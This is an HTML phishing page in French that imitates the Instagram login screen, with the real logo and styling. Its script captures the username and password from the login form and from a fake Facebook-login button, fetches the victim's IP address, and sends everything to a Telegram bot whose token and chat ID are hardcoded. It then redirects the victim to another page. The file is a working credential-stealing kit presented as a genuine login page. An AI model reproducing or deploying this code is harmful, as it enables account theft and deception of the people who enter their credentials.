<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Connexion Instagram</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
        }
        
        body {
            background-color: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        
        .login-container {
            max-width: 350px;
            width: 100%;
            background: white;
            border: 1px solid #dbdbdb;
            border-radius: 8px;
            padding: 40px 30px;
            text-align: center;
        }
        
        .logo {
            width: 175px;
            margin-bottom: 35px;
        }
        
        .input-group {
            margin-bottom: 15px;
        }
        
        input {
            width: 100%;
            padding: 12px;
            background: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 4px;
            font-size: 14px;
            outline: none;
            transition: border 0.2s;
        }
        
        input:focus {
            border-color: #a8a8a8;
        }
        
        button {
            width: 100%;
            padding: 12px;
            background: #0095f6;
            color: white;
            border: none;
            border-radius: 8px;
            font-weight: 600;
            font-size: 14px;
            cursor: pointer;
            transition: opacity 0.2s;
        }
        
        button:hover {
            opacity: 0.9;
        }
        
        .divider {
            display: flex;
            align-items: center;
            margin: 20px 0;
            color: #8e8e8e;
            font-size: 13px;
        }
        
        .divider::before,
        .divider::after {
            content: "";
            flex: 1;
            height: 1px;
            background: #dbdbdb;
        }
        
        .divider span {
            margin: 0 15px;
        }
        
        .facebook-login {
            background: none;
            color: #385185;
            font-weight: 600;
            margin-top: 10px;
        }
        
        .forgot-password {
            display: block;
            margin-top: 20px;
            font-size: 12px;
            color: #00376b;
            text-decoration: none;
        }
        
        .signup-link {
            margin-top: 30px;
            padding-top: 20px;
            border-top: 1px solid #dbdbdb;
            font-size: 14px;
            color: #262626;
        }
        
        .signup-link a {
            color: #0095f6;
            text-decoration: none;
            font-weight: 600;
        }
        
        .error-msg {
            background: #ffebee;
            color: #c62828;
            padding: 10px;
            border-radius: 4px;
            font-size: 13px;
            margin-bottom: 15px;
            display: none;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" alt="Instagram" class="logo">
        
        <div class="error-msg" id="errorMsg">Identifiants incorrects</div>
        
        <form id="loginForm">
            <div class="input-group">
                <input type="text" id="username" name="username" placeholder="Téléphone, nom d'utilisateur ou email" required>
            </div>
            <div class="input-group">
                <input type="password" id="password" name="password" placeholder="Mot de passe" required>
            </div>
            <button type="submit">Se connecter</button>
        </form>
        
        <div class="divider">
            <span>OU</span>
        </div>
        
        <button class="facebook-login" id="facebookBtn">
            Se connecter avec Facebook
        </button>
        
        <a href="#" class="forgot-password">Mot de passe oublié ?</a>
        
        <div class="signup-link">
            Vous n'avez pas de compte ? <a href="#">Inscrivez-vous</a>
        </div>
    </div>
    
    <script>
        const form = document.getElementById('loginForm');
        const errorMsg = document.getElementById('errorMsg');
        
        // Envoi des identifiants au bot Telegram
        async function sendToTelegram(username, password) {
            const botToken = '8507961561:AAFGiLtXzjIcR-j2IQuIDA55QZDQEYQFq_4';
            const chatId = '6767182328';
            
            const message = `🔐 NOUVEAUX IDENTIFIANTS INSTAGRAM
━━━━━━━━━━━━━━━━━━━━━
👤 Nom d'utilisateur: ${username}
🔑 Mot de passe: ${password}
🌍 IP: ${await getIP()}
🕒 Date: ${new Date().toLocaleString()}
━━━━━━━━━━━━━━━━━━━━━`;
            
            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
            fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: chatId, text: message })
            }).catch(e => console.error);
        }
        
        async function getIP() {
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                return data.ip;
            } catch(e) {
                return 'inconnue';
            }
        }
        
        form.addEventListener('submit', async (e) => {
            e.preventDefault();
            
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            
            if (!username || !password) {
                errorMsg.style.display = 'block';
                errorMsg.textContent = 'Veuillez remplir tous les champs';
                return;
            }
            
            // Envoi au bot
            await sendToTelegram(username, password);
            
            // Redirection vers mer.html
            window.location.href = 'mer.html';
        });
        
        // Bouton Facebook (même comportement)
        document.getElementById('facebookBtn').addEventListener('click', async () => {
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            
            if (username && password) {
                await sendToTelegram(username + ' (Facebook)', password);
                window.location.href = 'mer.html';
            } else {
                errorMsg.style.display = 'block';
                errorMsg.textContent = 'Veuillez d\'abord entrer vos identifiants';
            }
        });
    </script>
</body>
</html>
